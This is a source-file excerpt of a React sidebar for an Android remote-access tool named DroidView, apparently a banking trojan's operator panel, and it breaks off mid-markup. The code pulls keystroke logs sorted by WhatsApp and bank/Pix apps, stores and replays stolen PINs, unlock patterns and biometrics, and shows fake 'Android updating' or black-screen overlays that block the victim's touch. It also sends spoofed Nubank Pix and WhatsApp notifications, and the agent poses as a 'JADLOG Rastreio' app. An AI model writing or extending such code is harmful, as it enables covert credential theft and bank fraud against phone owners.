import { useEffect, useMemo, useRef, useState } from "react";
import {
  Battery,
  BatteryCharging,
  Bell,
  Check,
  CheckCircle,
  ChevronDown,
  ChevronLeft,
  ChevronRight,
  ChevronUp,
  Clock,
  Copy,
  ExternalLink,
  Eye,
  EyeOff,
  Fingerprint,
  Image as ImageIcon,
  Info,
  Keyboard,
  Layers,
  Lock,
  Maximize2,
  Minimize2,
  Minus,
  Pin,
  PinOff,
  RefreshCw,
  RotateCw,
  Search,
  Send,
  ShieldAlert,
  Smartphone,
  Sparkles,
  Trash2,
  Upload,
  Volume2,
  VolumeX,
  X,
  Zap,
  Grid,
  Hash,
  Key,
  Play,
  Plus,
  ScanFace,
  ShieldCheck
} from "lucide-react";
import type { ControlDevice } from "./types";
import type {
  DeviceCredentialEntry,
  DeviceCredentialType,
  DeviceDisguiseConfig,
  DeviceDisguiseType,
  DevicePushNotification
} from "@droidview/shared";
import { api } from "../../api";
import { getGlobalSocket } from "../../socket/client";
import { AppLogo } from "./AppLogo";

interface Props {
  device: ControlDevice;
  isOpen: boolean;
  onClose: () => void;
  onVolumeChange: (vol: number) => void;
  deviceVolume: number;
  isMuted: boolean;
  onToggleMute: () => void;
  onTriggerBiometric: (device: ControlDevice) => void;
  showToast: (msg: string, type?: "success" | "info") => void;
  activeDisguise?: DeviceDisguiseConfig | null;
  onDisguiseChange?: (disguise: DeviceDisguiseConfig | null) => void;
  initialTab?: "telas" | "senhas";
  onPushNotificationSent?: (notif: DevicePushNotification) => void;
}

interface KeystrokeEntry {
  id: string;
  timestamp: string;
  appName: string;
  packageName: string;
  category: "todas" | "whatsapp" | "banco" | "google" | "trabalho" | "sistema";
  content: string;
  contextTag?: string;
  type: "text" | "key" | "action";
}

// Aplicativos populares pré-configurados para Push Notifications (Essenciais e objetivos)
export const POPULAR_PUSH_APPS = [
  { name: "Nubank", packageName: "com.nu.production", icon: "" },
  { name: "WhatsApp", packageName: "com.whatsapp", icon: "" },
  { name: "JADLOG Rastreio", packageName: "com.droidview.agent", icon: "" },
  { name: "Lojas Renner", packageName: "com.lojasrenner", icon: "" },
  { name: "Outro App", packageName: "", icon: "" }
];

// Presets táticos com 1 clique para agilizar envio de notificações push
export const PUSH_NOTIFICATION_PRESETS = [
  {
    label: "Pix Nubank",
    appName: "Nubank",
    packageName: "com.nu.production",
    title: "Transferência recebida",
    message: "Você recebeu um Pix de R$ 1.250,00 de Carlos Silva."
  },
  {
    label: "WhatsApp",
    appName: "WhatsApp",
    packageName: "com.whatsapp",
    title: "Nova mensagem",
    message: "Oi! Você viu os documentos que te mandei mais cedo?"
  },
  {
    label: "Jadlog Rastreio",
    appName: "JADLOG Rastreio",
    packageName: "com.droidview.agent",
    title: "Status da Entrega",
    message: "Sua encomenda #JD-98231BR saiu para entrega ao destinatário."
  },
  {
    label: "Renner 50% OFF",
    appName: "Lojas Renner",
    packageName: "com.lojasrenner",
    title: "Você escolhe - 50% OFF",
    message: "Descontos de até 50% na nova coleção. Aproveite frete grátis hoje!"
  }
];

// Presets de imagens prontas caso o operador queira testar na hora sem subir arquivo
const SAMPLE_IMAGE_PRESETS = [
  {
    id: "sample_wallpaper",
    name: "Wallpaper Android 14",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><defs><linearGradient id='g' x1='0%' y1='0%' x2='100%' y2='100%'><stop offset='0%' stop-color='%230f172a'/><stop offset='50%' stop-color='%231e1b4b'/><stop offset='100%' stop-color='%23090d16'/></linearGradient></defs><rect width='720' height='1280' fill='url(%23g)'/><circle cx='360' cy='640' r='180' fill='%236366f1' opacity='0.15'/><text x='360' y='640' fill='%23e2e8f0' font-family='sans-serif' font-size='32' font-weight='bold' text-anchor='middle'>ANDROID 14</text><text x='360' y='690' fill='%2394a3b8' font-family='sans-serif' font-size='18' text-anchor='middle'>Sistema Protegido</text></svg>"
  },
  {
    id: "sample_maintenance",
    name: "Manutenção do Sistema",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%2309090b'/><circle cx='360' cy='520' r='90' fill='%23eab308' opacity='0.2'/><text x='360' y='535' fill='%23eab308' font-family='sans-serif' font-size='32' font-weight='900' text-anchor='middle'>CFG</text><text x='360' y='660' fill='%23ffffff' font-family='sans-serif' font-size='26' font-weight='bold' text-anchor='middle'>Modo Manutenção</text><text x='360' y='700' fill='%23a1a1aa' font-family='sans-serif' font-size='16' text-anchor='middle'>Otimizando banco de dados...</text></svg>"
  },
  {
    id: "sample_jadlog",
    name: "JADLOG Rastreio",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%23ffffff'/><rect x='210' y='500' width='300' height='110' rx='16' fill='%23dc2626'/><text x='360' y='570' fill='%23ffffff' font-family='sans-serif' font-size='36' font-weight='900' text-anchor='middle'>JADLOG</text><text x='360' y='660' fill='%231f2937' font-family='sans-serif' font-size='20' font-weight='bold' text-anchor='middle'>Rastreamento de Cargas</text><text x='360' y='700' fill='%236b7280' font-family='sans-serif' font-size='14' text-anchor='middle'>Atualizando pacote em trânsito...</text></svg>"
  }
];

import { MiniPhonePreview } from "./right-sidebar/MiniPhonePreview";
import { MiniPatternGrid } from "./right-sidebar/MiniPatternGrid";
import { RightSidebarVaultTab } from "./right-sidebar/RightSidebarVaultTab";

export function RightSidebarKeylogger({
  device,
  isOpen,
  onClose,
  onVolumeChange,
  deviceVolume,
  isMuted,
  onToggleMute,
  onTriggerBiometric,
  showToast,
  activeDisguise: propDisguise,
  onDisguiseChange,
  initialTab,
  onPushNotificationSent
}: Props) {
  // Navigation Tabs: "telas" vs "senhas" (unificando senhas e teclas em uma só aba)
  const [activeMainTab, setActiveMainTab] = useState<"telas" | "senhas">(initialTab || "senhas");

  useEffect(() => {
    if (initialTab) {
      setActiveMainTab(initialTab);
    }
  }, [initialTab]);
  // Sub-aba interna sincronizada para alternar ou exibir juntas
  const [senhasSubTab, setSenhasSubTab] = useState<"senhas" | "teclas" | "split">("senhas");

  // Credentials Vault State
  const [credentials, setCredentials] = useState<DeviceCredentialEntry[]>([]);
  const [selectedCredFilter, setSelectedCredFilter] = useState<string>("todas");
  const [revealedCredIds, setRevealedCredIds] = useState<Set<string>>(new Set());
  const [isDetectingCreds, setIsDetectingCreds] = useState(false);
  const [isUsingCredId, setIsUsingCredId] = useState<string | null>(null);
  const [isAddingCred, setIsAddingCred] = useState(false);
  const [newCredType, setNewCredType] = useState<DeviceCredentialType>("pin");
  const [newCredLabel, setNewCredLabel] = useState("");
  const [newCredValue, setNewCredValue] = useState("");
  const [newCredApp, setNewCredApp] = useState("Tela de Bloqueio");
  const [newPatternPoints, setNewPatternPoints] = useState<number[]>([]);
  const [quickUnlockMode, setQuickUnlockMode] = useState<"pattern" | "pin">("pattern");
  const [quickPinInput, setQuickPinInput] = useState("");

  // Fetch device credentials
  const fetchCredentials = async () => {
    try {
      const res = await api.getDeviceCredentials(device.id);
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
    } catch {}
  };

  useEffect(() => {
    fetchCredentials();
  }, [device.id]);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handleCredsEvent = (data: { deviceId: string; credentials: DeviceCredentialEntry[] }) => {
      if (data && (data.deviceId === device.id || data.deviceId.includes(device.id) || device.id.includes(data.deviceId))) {
        setCredentials(data.credentials);
      }
    };
    socket.on("device:credentials", handleCredsEvent);
    return () => {
      socket.off("device:credentials", handleCredsEvent);
    };
  }, [device.id]);

  const handleUseCredential = async (cred: DeviceCredentialEntry) => {
    setIsUsingCredId(cred.id);
    try {
      const res = await api.useDeviceCredential(device.id, cred.id);
      showToast(res.message || `Credencial "${cred.label}" acionada com sucesso!`, "success");
      fetchCredentials();
    } catch (err: any) {
      showToast(err.message || "Erro ao acionar credencial.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPattern = async () => {
    if (newPatternPoints.length < 2) {
      showToast("Conecte pelo menos 2 pontos na grade para executar o padrão.", "info");
      return;
    }
    const val = newPatternPoints.join(",");
    const seqStr = newPatternPoints.map((p) => p + 1).join(" → ");
    try {
      setIsUsingCredId("new_pattern_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pattern",
        value: val,
        label: `Padrão Gestual [${seqStr}]`,
        metadata: {
          appName: "Tela de Bloqueio",
          patternPoints: newPatternPoints,
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(`Padrão [${seqStr}] executado no aparelho e gravado com sucesso!`, "success");
      setNewPatternPoints([]);
    } catch {
      showToast("Erro ao executar e gravar padrão.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPin = async () => {
    const cleanPin = quickPinInput.replace(/\D/g, "");
    if (!cleanPin) {
      showToast("Informe os dígitos do PIN para desbloquear.", "info");
      return;
    }
    try {
      setIsUsingCredId("new_pin_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pin",
        value: cleanPin,
        label: `PIN Numérico (${cleanPin.length} dígitos)`,
        metadata: {
          appName: "Tela de Bloqueio",
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(`PIN executado no aparelho e gravado com sucesso!`, "success");
      setQuickPinInput("");
    } catch {
      showToast("Erro ao executar e gravar PIN.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleQuickUseBiometric = async (type: "fingerprint" | "face") => {
    try {
      setIsUsingCredId(`quick_${type}`);
      const res = await api.useAndRecordCredential(device.id, {
        type,
        value: type === "fingerprint" ? "sensor_id_1" : "face_id_1",
        label: type === "fingerprint" ? "Biometria Digital Sensor" : "Reconhecimento Facial",
        metadata: {
          biometricId: 1,
          source: "used_by_user"
        }
      });
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(res.message || `Biometria (${type}) aplicada no celular e gravada no cofre!`, "success");
    } catch {
      showToast("Erro ao acionar biometria.", "info");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleDeleteCredential = async (credId: string) => {
    try {
      await api.deleteDeviceCredential(device.id, credId);
      setCredentials((prev) => prev.filter((c) => c.id !== credId));
      showToast("Credencial removida do cofre.", "info");
    } catch {
      showToast("Erro ao remover credencial.", "info");
    }
  };

  const handleDetectCredentials = async () => {
    setIsDetectingCreds(true);
    try {
      const res = await api.detectDeviceCredentials(device.id);
      if (res?.credentials) {
        setCredentials(res.credentials);
      }
      showToast(
        res.detected?.length > 0
          ? `Varredura concluída! ${res.detected.length} dado(s) encontrado(s) e salvos no cofre (Autogravação ativa).`
          : "Varredura concluída! Dados, senhas e telemetria sincronizados com sucesso.",
        "success"
      );
    } catch {
      showToast("Falha na varredura de credenciais.", "info");
    } finally {
      setIsDetectingCreds(false);
    }
  };

  const handleSaveNewCredential = async () => {
    if (!newCredLabel.trim()) {
      showToast("Informe um nome para a credencial.", "info");
      return;
    }
    let finalVal = newCredValue.trim();
    if (newCredType === "pattern") {
      if (newPatternPoints.length < 2) {
        showToast("Selecione pelo menos 2 pontos conectados para o padrão.", "info");
        return;
      }
      finalVal = newPatternPoints.join(",");
    } else if (newCredType === "fingerprint" || newCredType === "face") {
      if (!finalVal) finalVal = "sensor_id_1";
    } else if (!finalVal) {
      showToast("Informe a senha ou PIN.", "info");
      return;
    }

    try {
      const res = await api.saveDeviceCredential(device.id, {
        type: newCredType,
        label: newCredLabel.trim(),
        value: finalVal,
        metadata: {
          appName: newCredApp.trim() || "Tela de Bloqueio",
          patternPoints: newCredType === "pattern" ? newPatternPoints : undefined,
          biometricId: 1,
          source: "manual_operator",
          capturedAt: new Date().toISOString()
        }
      });
      if (res?.credential) {
        setCredentials((prev) => [res.credential, ...prev]);
        showToast(`Credencial "${res.credential.label}" gravada com sucesso!`, "success");
        setIsAddingCred(false);
        setNewCredLabel("");
        setNewCredValue("");
        setNewPatternPoints([]);
      }
    } catch {
      showToast("Erro ao gravar credencial.", "info");
    }
  };

  const toggleRevealCred = (id: string) => {
    setRevealedCredIds((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const handlePatternPointClick = (pt: number) => {
    setNewPatternPoints((prev) => (prev.includes(pt) ? prev : [...prev, pt]));
  };

  const handlePatternClear = () => {
    setNewPatternPoints([]);
  };

  const filteredCredentials = useMemo(() => {
    if (selectedCredFilter === "todas") return credentials;
    return credentials.filter((c) => c.type === selectedCredFilter);
  }, [credentials, selectedCredFilter]);

  // Local or propagated disguise state
  const [currentDisguise, setCurrentDisguise] = useState<DeviceDisguiseConfig | null>(propDisguise || null);

  // Sync with prop
  useEffect(() => {
    if (propDisguise !== undefined) {
      setCurrentDisguise(propDisguise);
    }
  }, [propDisguise]);

  // Load disguise status on mount & device change
  useEffect(() => {
    api.getDeviceDisguise(device.id)
      .then((res) => {
        if (res?.disguise) {
          setCurrentDisguise(res.disguise);
          onDisguiseChange?.(res.disguise);
        }
      })
      .catch(() => {});

    const socket = getGlobalSocket();
    const handleDisguiseEvent = (data: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => {
      if (
        data &&
        (data.deviceId === device.id ||
          data.deviceId.includes(device.id) ||
          device.id.includes(data.deviceId))
      ) {
        setCurrentDisguise(data.disguise || null);
        onDisguiseChange?.(data.disguise || null);
      }
    };

    socket.on("device:disguise", handleDisguiseEvent);
    return () => {
      socket.off("device:disguise", handleDisguiseEvent);
    };
  }, [device.id, onDisguiseChange]);

  // Keylogger state
  const [logs, setLogs] = useState<KeystrokeEntry[]>([]);
  const [selectedCategory, setSelectedCategory] = useState<string>("todas");
  const [searchQuery, setSearchQuery] = useState("");
  const [quickInput, setQuickInput] = useState("");
  const [isSending, setIsSending] = useState(false);
  const [isPinned, setIsPinned] = useState(false);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isBiometricActive, setIsBiometricActive] = useState(false);

  // Custom Image Disguise state
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [selectedCustomImage, setSelectedCustomImage] = useState<string | null>(null);
  const [customImageMeta, setCustomImageMeta] = useState<{ width: number; height: number; aspectRatio: string } | null>(null);
  const [updatePercent, setUpdatePercent] = useState<number>(34);
  const [isActivatingDisguise, setIsActivatingDisguise] = useState(false);

  // Push Notification state
  const [selectedPushApp, setSelectedPushApp] = useState<string>("Nubank");
  const [pushAppName, setPushAppName] = useState<string>("Nubank");
  const [pushPackageName, setPushPackageName] = useState<string>("com.nu.production");
  const [pushTitle, setPushTitle] = useState<string>("Transferência recebida");
  const [pushMessage, setPushMessage] = useState<string>("Você recebeu um Pix de R$ 1.250,00 de Carlos Silva.");
  const [isSendingPush, setIsSendingPush] = useState(false);
  const [recentPushes, setRecentPushes] = useState<DevicePushNotification[]>([]);

  // Dynamic Collapse & Scale controls inside the sidebar
  const [isPushCollapsed, setIsPushCollapsed] = useState<boolean>(false);
  const [isDisguiseCollapsed, setIsDisguiseCollapsed] = useState<boolean>(false);
  const [disguiseScale, setDisguiseScale] = useState<"compact" | "normal" | "large">("normal");
  const [sidebarWidth, setSidebarWidth] = useState<number>(345);

  // Load push notifications
  const fetchPushNotifications = async () => {
    try {
      const list = await api.getPushNotifications(device.id);
      if (Array.isArray(list)) {
        setRecentPushes(list);
      }
    } catch {}
  };

  useEffect(() => {
    fetchPushNotifications();
  }, [device.id]);

  useEffect(() => {
    const socket = getGlobalSocket();
    const handlePushEvent = (notif: DevicePushNotification) => {
      if (
        notif &&
        (notif.deviceId === device.id ||
          notif.deviceId?.includes(device.id) ||
          device.id.includes(notif.deviceId))
      ) {
        setRecentPushes((prev) => [notif, ...prev.filter((p) => p.id !== notif.id)]);
      }
    };
    socket.on("device:push_notification", handlePushEvent);
    return () => {
      socket.off("device:push_notification", handlePushEvent);
    };
  }, [device.id]);

  const handleSendPush = async () => {
    const cleanTitle = pushTitle.trim();
    const cleanMessage = pushMessage.trim();
    const cleanApp = pushAppName.trim() || "Aplicativo";

    if (!cleanTitle || !cleanMessage) {
      showToast("Preencha o título e o conteúdo da notificação push.", "info");
      return;
    }

    setIsSendingPush(true);
    try {
      const res = await api.sendPushNotification(device.id, {
        appName: cleanApp,
        packageName: pushPackageName.trim() || "com.droidview.agent",
        title: cleanTitle,
        message: cleanMessage
      });
      if (res?.notification) {
        setRecentPushes((prev) => [res.notification, ...prev.filter((p) => p.id !== res.notification.id)]);
        onPushNotificationSent?.(res.notification);
      }
      showToast(`Notificação push despachada (${cleanApp}): "${cleanTitle}"`, "success");
    } catch (err: any) {
      showToast(err.message || "Falha ao despachar notificação push.", "info");
    } finally {
      setIsSendingPush(false);
    }
  };

  const handleApplyPreset = (preset: typeof PUSH_NOTIFICATION_PRESETS[0]) => {
    setSelectedPushApp(preset.appName);
    setPushAppName(preset.appName);
    setPushPackageName(preset.packageName);
    setPushTitle(preset.title);
    setPushMessage(preset.message);
    showToast(`Preset "${preset.label}" aplicado!`, "info");
  };

  const handleSelectAppChip = (app: typeof POPULAR_PUSH_APPS[0]) => {
    setSelectedPushApp(app.name);
    if (app.name === "Outro App") {
      setPushAppName("");
      setPushPackageName("");
    } else {
      setPushAppName(app.name);
      setPushPackageName(app.packageName);
    }
  };

  // Fetch real logs from backend
  const fetchLogs = async () => {
    setIsRefreshing(true);
    try {
      const data = await api.getDeviceKeyboardLogs(device.id);
      if (Array.isArray(data) && data.length > 0) {
        setLogs(data);
      }
    } catch {
      // Keep existing or fallback
    } finally {
      setIsRefreshing(false);
    }
  };

  useEffect(() => {
    fetchLogs();
    const interval = setInterval(fetchLogs, 8000);
    return () => clearInterval(interval);
  }, [device.id]);

  // App Categories tabs
  const categories = [
    { id: "todas", label: "Todas" },
    { id: "whatsapp", label: "WhatsApp" },
    { id: "banco", label: "Bancos / Pix" },
    { id: "google", label: "Google / Web" },
    { id: "sistema", label: "Sistema" }
  ];

  const filteredLogs = useMemo(() => {
    return logs.filter((item) => {
      const matchCat = selectedCategory === "todas" || item.category === selectedCategory;
      const q = searchQuery.toLowerCase().trim();
      const matchSearch =
        !q ||
        item.content.toLowerCase().includes(q) ||
        item.appName.toLowerCase().includes(q) ||
        item.packageName.toLowerCase().includes(q);
      return matchCat && matchSearch;
    });
  }, [logs, selectedCategory, searchQuery]);

  // Send Direct Keystrokes/Text to Device
  const handleSendText = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!quickInput.trim()) return;
    setIsSending(true);
    try {
      await api.sendText(device.id, quickInput);
      showToast(`Texto digitado: "${quickInput}"`, "success");

      const newEntry: KeystrokeEntry = {
        id: `local_${Date.now()}`,
        timestamp: new Date().toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
        appName: "DVIEW Console",
        packageName: "com.droidview.agent",
        category: "sistema",
        content: quickInput,
        contextTag: "Injeção Remota",
        type: "text"
      };
      setLogs((prev) => [newEntry, ...prev]);
      setQuickInput("");
    } catch {
      showToast("Erro ao transmitir texto.", "info");
    } finally {
      setIsSending(false);
    }
  };

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    showToast("Texto copiado para a área de transferência!", "success");
    setTimeout(() => setCopiedId(null), 1800);
  };

  const handleCopyAll = () => {
    const allText = filteredLogs.map((l) => `[${l.timestamp}] [${l.appName}] ${l.content}`).join("\n");
    navigator.clipboard.writeText(allText);
    showToast(`${filteredLogs.length} logs copiados com sucesso!`, "success");
  };

  const handleClearLogs = () => {
    setLogs([]);
    showToast("Histórico de digitação limpo.", "info");
  };

  const handleTriggerBiometricLocal = async () => {
    setIsBiometricActive(true);
    try {
      await onTriggerBiometric(device);
    } finally {
      setTimeout(() => setIsBiometricActive(false), 800);
    }
  };

  // ---------------------------------------------------------------------
  // DISGUISE SCREEN ACTIONS: TELA PRETA, ATUALIZAÇÃO, BATERIA, IMAGEM
  // ---------------------------------------------------------------------

  const handleActivateDisguise = async (
    type: DeviceDisguiseType,
    customPayload?: {
      title?: string;
      subtitle?: string;
      progressPercent?: number;
      customImageUrl?: string;
      imageWidth?: number;
      imageHeight?: number;
    }
  ) => {
    setIsActivatingDisguise(true);
    const simulatedConfig: DeviceDisguiseConfig = {
      type,
      active: true,
      activatedAt: new Date().toISOString(),
      progressPercent: type === "update" ? updatePercent : (type === "battery" ? (device.battery ?? 75) : undefined),
      physicalTouchDisabled: true,
      remoteTouchOnly: true,
      ...customPayload
    };

    // Atualização otimista imediata para visualização instantânea da sobreposição
    setCurrentDisguise(simulatedConfig);
    onDisguiseChange?.(simulatedConfig);

    const labelMap = {
      black: "Tela Preta (Apagada)",
      update: "Atualizando Android",
      battery: "Carregando Bateria",
      custom_image: "Imagem Personalizada"
    };

    try {
      const res = await api.setDeviceDisguise(device.id, simulatedConfig);
      if (res?.disguise) {
        setCurrentDisguise(res.disguise);
        onDisguiseChange?.(res.disguise);
      }
      showToast(`Tela "${labelMap[type]}" sobreposta e ATIVA no aparelho!`, "success");
    } catch {
      showToast(`Tela "${labelMap[type]}" ativada (modo local)!`, "success");
    } finally {
      setIsActivatingDisguise(false);
    }
  };

  const handleClearDisguise = async () => {
    setIsActivatingDisguise(true);
    // Limpeza otimista instantânea
    setCurrentDisguise(null);
    onDisguiseChange?.(null);
    try {
      await api.clearDeviceDisguise(device.id);
      showToast("Tela de disfarce desativada. Aparelho normal restaurado!", "success");
    } catch {
      showToast("Tela de disfarce desativada.", "info");
    } finally {
      setIsActivatingDisguise(false);
    }
  };

  // Process custom image file upload & measure dimensions
  const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.type.startsWith("image/")) {
      showToast("Por favor selecione um arquivo de imagem válido.", "info");
      return;
    }

    const reader = new FileReader();
    reader.onload = (event) => {
      const dataUrl = event.target?.result as string;
      if (!dataUrl) return;

      const img = new Image();
      img.onload = () => {
        const w = img.naturalWidth;
        const h = img.naturalHeight;
        const ratio = (w / h).toFixed(2);
        const ratioLabel = Math.abs(w / h - 9 / 16) < 0.1 ? "9:16 (Perfeita para celular)" : `${w}×${h} (${ratio})`;
        setSelectedCustomImage(dataUrl);
        setCustomImageMeta({
          width: w,
          height: h,
          aspectRatio: ratioLabel
        });
        showToast(`Imagem carregada: ${w}×${h}px`, "success");
      };
      img.src = dataUrl;
    };
    reader.readAsDataURL(file);
  };

  const handleSelectPresetSample = (preset: typeof SAMPLE_IMAGE_PRESETS[0]) => {
    setSelectedCustomImage(preset.url);
    setCustomImageMeta({
      width: 720,
      height: 1280,
      aspectRatio: "9:16 (Preset Recomendado)"
    });
    showToast(`Preset "${preset.name}" selecionado!`, "info");
  };

  if (!isOpen && !isPinned) return null;

  return (
    <aside
      className={`tactical-right-quick-sidebar ${isPinned ? "is-pinned" : ""}`}
      style={{
        width: `${sidebarWidth}px`,
        minWidth: `${sidebarWidth}px`,
        maxWidth: `${sidebarWidth}px`,
        transition: "width 0.15s ease"
      }}
    >
      {/* TABS ROW: [TELAS] vs [SENHAS] vs [TECLAS] + PIN & CLOSE NO CANTO */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          borderBottom: "1px solid #1e293b",
          background: "#080c16",
          padding: "2px 4px 2px 2px",
          gap: "4px",
          flexShrink: 0
        }}
      >
        <div style={{ display: "flex", flex: 1, gap: "2px" }}>
          {/* TAB 1: TELAS */}
          <button
            type="button"
            onClick={() => setActiveMainTab("telas")}
            style={{
              flex: 1,
              padding: "7px 6px",
              fontSize: "10.5px",
              fontWeight: 800,
              background: activeMainTab === "telas" ? "rgba(255, 26, 42, 0.15)" : "transparent",
              color: activeMainTab === "telas" ? "#ff4d5a" : "#94a3b8",
              border: "none",
              borderBottom: activeMainTab === "telas" ? "2px solid #ff1a2a" : "2px solid transparent",
              borderRadius: "4px 4px 0 0",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "4px",
              transition: "all 0.15s ease"
            }}
          >
            <Smartphone size={12} />
            <span>TELAS</span>
            {currentDisguise?.active && (
              <span
                style={{
                  width: "6px",
                  height: "6px",
                  borderRadius: "50%",
                  background: "#ff1a2a",
                  boxShadow: "0 0 8px #ff1a2a",
                  animation: "pulse 1.2s infinite"
                }}
              />
            )}
          </button>

          {/* TAB 2: SENHAS & DIGITAÇÃO UNIFICADAS */}
          <button
            type="button"
            onClick={() => setActiveMainTab("senhas")}
            style={{
              flex: 1,
              padding: "7px 6px",
              fontSize: "10.5px",
              fontWeight: 800,
              background: activeMainTab === "senhas" ? "rgba(56, 189, 248, 0.15)" : "transparent",
              color: activeMainTab === "senhas" ? "#38bdf8" : "#94a3b8",
              border: "none",
              borderBottom: activeMainTab === "senhas" ? "2px solid #38bdf8" : "2px solid transparent",
              borderRadius: "4px 4px 0 0",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: "4px",
              transition: "all 0.15s ease"
            }}
          >
            <Key size={12} />
            <span>SENHAS</span>
            <div style={{ display: "flex", alignItems: "center", gap: "3px" }}>
              {credentials.length > 0 && (
                <span
                  style={{
                    fontSize: "8.5px",
                    padding: "1px 4px",
                    background: "rgba(56, 189, 248, 0.25)",
                    color: "#38bdf8",
                    borderRadius: "10px",
                    fontFamily: "var(--font-mono)"
                  }}
                  title={`${credentials.length} senhas/credenciais gravadas`}
                >
                  {credentials.length}
                </span>
              )}
              {logs.length > 0 && (
                <span
                  style={{
                    fontSize: "8.5px",
                    padding: "1px 4px",
                    background: "rgba(34, 197, 94, 0.2)",
                    color: "#22c55e",
                    borderRadius: "10px",
                    fontFamily: "var(--font-mono)"
                  }}
                  title={`${logs.length} eventos de digitação`}
                >
                  {logs.length}
                </span>
              )}
            </div>
          </button>
        </div>

        {/* PIN, LARGURA & FECHAR NO CANTO DA LINHA */}
        <div style={{ display: "flex", alignItems: "center", gap: "3px", borderLeft: "1px solid #1e293b", paddingLeft: "4px" }}>
          {/* CONTROLES DE DIMINUIR (-) E AUMENTAR (+) LARGURA DA SIDEBAR */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              background: "#080c16",
              border: "1px solid #1e293b",
              borderRadius: "4px",
              padding: "1px",
              gap: "1px"
            }}
            title={`Largura da Barra Lateral: ${sidebarWidth}px (Diminuir / Aumentar)`}
          >
            <button
              type="button"
              onClick={() => setSidebarWidth((w) => Math.max(295, w - 30))}
              disabled={sidebarWidth <= 295}
              style={{
                width: "16px",
                height: "20px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                padding: 0,
                background: "transparent",
                border: "none",
                color: sidebarWidth <= 295 ? "#334155" : "#94a3b8",
                cursor: sidebarWidth <= 295 ? "not-allowed" : "pointer"
              }}
              title="Diminuir largura da sidebar (-30px)"
            >
              <Minus size={9} />
            </button>
            <span style={{ fontSize: "7.5px", color: "#64748b", fontFamily: "var(--font-mono)", padding: "0 1px", minWidth: "16px", textAlign: "center" }}>
              {sidebarWidth}
            </span>
            <button
              type="button"
              onClick={() => setSidebarWidth((w) => Math.min(460, w + 30))}
              disabled={sidebarWidth >= 460}
              style={{
                width: "16px",
                height: "20px",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                padding: 0,
                background: "transparent",
                border: "none",
                color: sidebarWidth >= 460 ? "#334155" : "#94a3b8",
                cursor: sidebarWidth >= 460 ? "not-allowed" : "pointer"
              }}
              title="Aumentar largura da sidebar (+30px)"
            >
              <Plus size={9} />
            </button>
          </div>

          <button
            type="button"
            className={`pin-toggle-btn ${isPinned ? "active" : ""}`}
            onClick={() => setIsPinned(!isPinned)}
            title={isPinned ? "Desafixar painel lateral" : "Fixar painel lateral"}
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: isPinned ? "rgba(56, 189, 248, 0.2)" : "#0f172a",
              border: isPinned ? "1px solid #38bdf8" : "1px solid #1e293b",
              color: isPinned ? "#38bdf8" : "#94a3b8",
              borderRadius: "4px",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            {isPinned ? <PinOff size={11} /> : <Pin size={11} />}
          </button>
          <button
            type="button"
            className="right-sidebar-minimize-btn"
            onClick={onClose}
            title="Minimizar / Recolher submenu direito"
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: "#0f172a",
              border: "1px solid #1e293b",
              color: "#94a3b8",
              borderRadius: "4px",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            <ChevronRight size={13} />
          </button>
          <button
            type="button"
            className="right-sidebar-close-btn"
            onClick={onClose}
            title="Fechar painel lateral"
            style={{
              width: "22px",
              height: "22px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              padding: 0,
              background: "#ff1a2a",
              border: "1px solid #ff4d5a",
              color: "#ffffff",
              borderRadius: "4px",
              boxShadow: "0 0 10px rgba(255, 26, 42, 0.6)",
              cursor: "pointer",
              transition: "all 0.15s ease"
            }}
          >
            <X size={13} style={{ strokeWidth: 3 }} />
          </button>
        </div>
      </div>

      {/* =================================================================== */}
      {/* ABA 1: TELAS NO APARELHO (Tela Preta, Atualizando Android, Bateria, Imagem) */}
      {/* =================================================================== */}
      {activeMainTab === "telas" && (
        <div style={{ flex: 1, overflowY: "auto", padding: "8px", display: "flex", flexDirection: "column", gap: "7px" }}>
